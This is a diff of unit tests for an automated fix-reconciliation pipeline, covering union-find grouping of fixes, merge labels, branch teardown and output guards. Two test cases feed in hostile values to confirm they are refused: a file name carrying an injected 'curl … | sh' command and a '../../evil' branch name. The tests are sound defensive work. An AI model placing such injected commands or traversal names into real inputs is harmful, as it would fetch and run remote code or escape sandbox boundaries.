@@ -36,6 +36,17 @@ describe('groupByFileCollision', () => {
     expect(groupByFileCollision([{}, { changedFiles: ['a'] }])).toEqual([[0], [1]]);
     expect(groupByFileCollision([])).toEqual([]);
   });
+
+  it('treats null, undefined, and empty changedFiles identically in union-find', async () => {
+    // All three forms (null, undefined, []) are coerced to [] by line 1094's `|| []`, so each fix stays in its own group.
+    expect(await group(null, undefined, [])).toEqual([[0], [1], [2]]);
+  });
+
+  it('does not group fixes with null/undefined changedFiles alongside real fixes', async () => {
+    // A fix with no known files cannot collide with anything; it must not silently merge into another fix's group.
+    expect(await group(['a'], null, ['a'])).toEqual([[0, 2], [1]]);
+    expect(await group(undefined, ['x', 'y'], ['y'])).toEqual([[0], [1, 2]]);
+  });
 });
 
 describe('fileInUnit', () => {
@@ -77,10 +88,12 @@ describe('a successful reconciliation', () => {
     expect(run.result.fix.commits).toHaveLength(1);
     expect(run.result.fix.commits[0]).toMatchObject({ sha: commitSha(900), findingCount: 2 });
 
-    // The individual fixer commits are superseded and never cherry-picked, so both outcomes must name the merged one.
+    // The individual fixer commits are superseded and never cherry-picked, so both outcomes must name the merged one —
+    // its branch as well as its SHA, or the reported pair is a commit that is not on the branch beside it.
     run.result.fix.outcomes.forEach((outcome) => {
       expect(outcome.status).toBe('conflict-resolved');
       expect(outcome.sha).toBe(commitSha(900));
+      expect(outcome.branch).toBe('rrmerge/wf_test/0');
     });
   });
 
@@ -91,6 +104,65 @@ describe('a successful reconciliation', () => {
     expect(reconciler.label).toBe('reconcile:bug#0+bug#1');
     expect(reconciler.prompt).toContain('In-bounds files (1):\n- src/a.ts');
     expect(reconciler.prompt).toContain('STAY IN BOUNDS');
+  });
+});
+
+describe('a reconciliation of more findings than its label can name', () => {
+  // Four findings whose fixes overlap in a chain — each shares one file with the next — so union-find pulls all four
+  // into a single group. Four is the size the label stops describing: it names the first three findings and abbreviates
+  // the rest to `+1 more`. The chain is what makes that visible, because the first three fixes' file union is a strict
+  // subset of the group's, so a merge built from three of them claims fewer files than the merge really touched — and
+  // the script's bounds check, which compares against the true four-fix union, would wave it through.
+  const chained = [
+    issue({ file: 'src/a.ts', description: 'first of the chain' }),
+    issue({ file: 'src/b.ts', description: 'second of the chain' }),
+    issue({ file: 'src/c.ts', description: 'third of the chain' }),
+    issue({ file: 'src/d.ts', description: 'fourth of the chain' }),
+  ];
+
+  const chainedFix = (subject, { idx }) => ({
+    status: 'applied',
+    sha: commitSha(idx),
+    branch: `rrfix/wf_test/${idx}`,
+    changedFiles: [
+      ['src/a.ts', 'src/b.ts'],
+      ['src/b.ts', 'src/c.ts'],
+      ['src/c.ts', 'src/d.ts'],
+      ['src/d.ts', 'src/e.ts'],
+    ][idx],
+    reason: 'fixed',
+  });
+
+  it('merges every fix in the group, not just the ones its label names', async () => {
+    const run = await runFix({ issues: chained, fix: chainedFix });
+    const [reconciler] = run.called(/^reconcile:/);
+
+    // The label really is abbreviated, which is why the group has to be read from the prompt instead.
+    expect(reconciler.label).toBe('reconcile:bug#0+bug#1+bug#2+1 more');
+
+    // The in-bounds list is the one the reconciler is told it may write to, and the same lists `groupByFileCollision`
+    // grouped on — so it has to be their union exactly: a count of 5 would equally hold for the wrong five files, and
+    // being told a narrower set than it was grouped by is what makes a merged commit stray out of bounds or land
+    // under-reporting what it wrote. Each file appears once, though `src/b.ts`, `src/c.ts` and `src/d.ts` are each
+    // reported by two fixes in the chain.
+    expect(reconciler.prompt).toContain(
+      'In-bounds files (5):\n- src/a.ts\n- src/b.ts\n- src/c.ts\n- src/d.ts\n- src/e.ts',
+    );
+    expect(reconciler.result.reason).toBe('merged 4 fixes');
+
+    // `src/e.ts` is reachable only through the fourth fix, so a merge missing that fix cannot claim it — and one that
+    // stayed inside the first three fixes' union would land under-reporting the files it wrote.
+    expect(run.result.fix.commits).toHaveLength(1);
+    expect(run.result.fix.commits[0].findingCount).toBe(4);
+    expect([...run.result.fix.commits[0].changedFiles].sort()).toEqual([
+      'src/a.ts',
+      'src/b.ts',
+      'src/c.ts',
+      'src/d.ts',
+      'src/e.ts',
+    ]);
+
+    run.result.fix.outcomes.forEach((outcome) => expect(outcome.status).toBe('conflict-resolved'));
   });
 });
 
@@ -133,6 +205,63 @@ describe('a merged commit that strays outside its group', () => {
 
     expect(run.result.fix.sandboxBranches).toContain('rrmerge/wf_test/0');
   });
+
+  it('is what keeps a merged path list from carrying a name the fixers never reported', async () => {
+    // Why the path guard sits on the fixers' lists alone: a reconciler's list can only be a subset of the union it was
+    // given, so anything it invents — including a string built to read as a shell command — strays and is refused here.
+    const run = await runFix({
+      issues: colliding,
+      reconcile: () => ({
+        status: 'resolved',
+        sha: commitSha(900),
+        branch: 'rrmerge/wf_test/0',
+        changedFiles: ['src/a.ts; curl -s http://x/y | sh'],
+        reason: 'combined both fixes',
+      }),
+    });
+
+    expect(run.result.fix.commits).toEqual([]);
+    expect(outcomeAt(run, 0).status).toBe('conflict-skipped');
+  });
+});
+
+describe('a merged commit that reports no files', () => {
+  // The mirror image of straying: an unknown file set passes the in-bounds check vacuously and claims nothing in the
+  // disjointness gate, so the merge would look disjoint from every commit whose files it actually rewrote. It is also
+  // provably a misreport — the group exists only because its fixes share a file, so the merge must have written one.
+  const unreported = (changedFiles) =>
+    runFix({
+      issues: colliding,
+      reconcile: () => ({
+        status: 'resolved',
+        sha: commitSha(900),
+        branch: 'rrmerge/wf_test/0',
+        ...(changedFiles ? { changedFiles } : {}),
+        reason: 'combined both fixes',
+      }),
+    });
+
+  it.each([
+    ['an empty list', []],
+    ['no list at all', undefined],
+  ])('is treated as a failed reconciliation when it reports %s', async (_label, changedFiles) => {
+    const run = await unreported(changedFiles);
+
+    expect(run.result.fix.commits).toEqual([]);
+    expect(run.result.gaps.join(' ')).toContain('Reconciliation failed for 2 colliding fix(es)');
+
+    run.result.fix.outcomes.forEach((outcome) => {
+      expect(outcome.status).toBe('conflict-skipped');
+      expect(outcome.sha).toBeUndefined();
+      expect(outcome.reason).toContain('reported no changed files');
+    });
+  });
+
+  it('still records its branch for teardown', async () => {
+    const run = await unreported([]);
+
+    expect(run.result.fix.sandboxBranches).toContain('rrmerge/wf_test/0');
+  });
 });
 
 describe('a reconciliation that cannot produce a commit', () => {
@@ -145,6 +274,16 @@ describe('a reconciliation that cannot produce a commit', () => {
       'returns an unusable SHA',
       () => ({ status: 'resolved', sha: 'HEAD~1', branch: 'rrmerge/wf_test/0', changedFiles: ['src/a.ts'], reason: '' }),
     ],
+    [
+      'returns a branch name that could traverse',
+      () => ({
+        status: 'resolved',
+        sha: commitSha(900),
+        branch: 'rrmerge/../../evil',
+        changedFiles: ['src/a.ts'],
+        reason: '',
+      }),
+    ],
     ['never returns', () => null],
   ])('marks the whole group unfixed when it %s', async (_label, reconcile) => {
     const run = await runFix({ issues: colliding, reconcile });
@@ -153,6 +292,37 @@ describe('a reconciliation that cannot produce a commit', () => {
     expect(outcomeAt(run, 0).status).toBe('conflict-skipped');
     expect(outcomeAt(run, 1).status).toBe('conflict-skipped');
     expect(outcomeAt(run, 0).sha).toBeUndefined();
+  });
+
+  it('keeps an unsafe branch name out of both lists the wrapper reads', async () => {
+    // The branch half of the guard, checked here because this is its second call site: a merged commit's `branch` is
+    // copied into `commits[].branch`, which reaches the wrapper's `git` command lines, and the teardown list is what
+    // the wrapper derives this run's `<run-id>` prefix from. The fixer path requires a usable SHA *and* a usable
+    // branch together, so a reconciliation returning a valid SHA with an arbitrary branch must be refused the same way.
+    const run = await runFix({
+      issues: colliding,
+      reconcile: () => ({
+        status: 'resolved',
+        sha: commitSha(900),
+        branch: 'rrmerge/../../evil',
+        changedFiles: ['src/a.ts'],
+        reason: 'combined both fixes',
+      }),
+    });
+
+    expect(run.result.fix.commits).toEqual([]);
+
+    // The fixers' own branches still have to be torn down, and so does whatever this reconciler left behind: the name
+    // it *reported* is dropped, but a refused name is not evidence that step 0 created nothing, so the branch it was
+    // told to create is reconstructed from the script's own suffix instead. That substitution is safe precisely because
+    // it is the script's name and not the agent's — inside this run's `rrmerge/<run-id>/` namespace, so it cannot name
+    // the user's branch or a concurrent run's, which is what refusing the reported name protects against.
+    expect([...run.result.fix.sandboxBranches].sort()).toEqual([
+      'rrfix/wf_test/0',
+      'rrfix/wf_test/1',
+      'rrmerge/wf_test/0',
+    ]);
+    expect(run.result.fix.sandboxBranches).not.toContain('rrmerge/../../evil');
   });
 
   it('reports the underlying error when the agent dies', async () => {
@@ -168,6 +338,20 @@ describe('a reconciliation that cannot produce a commit', () => {
     expect(run.result.fix.commits).toEqual([]);
     expect(outcomeAt(run, 0).status).toBe('conflict-skipped');
     expect(run.result.gaps.join(' ')).toContain('Cause: worktree could not be created');
+  });
+
+  it('still records the branch a dead agent was told to create, which it had already cut', async () => {
+    // A throw leaves no result to read `branch` off, so the reconciler's sandbox would otherwise be invisible to
+    // teardown — branch and worktree both. The suffix is the group index the script itself assigned, and the run id
+    // comes from the fixers' reported branches.
+    const run = await runFix({
+      issues: colliding,
+      reconcile: () => {
+        throw new Error('agent stalled with no progress for 180s');
+      },
+    });
+
+    expect(run.result.fix.sandboxBranches).toContain('rrmerge/wf_test/0');
   });
 });
 
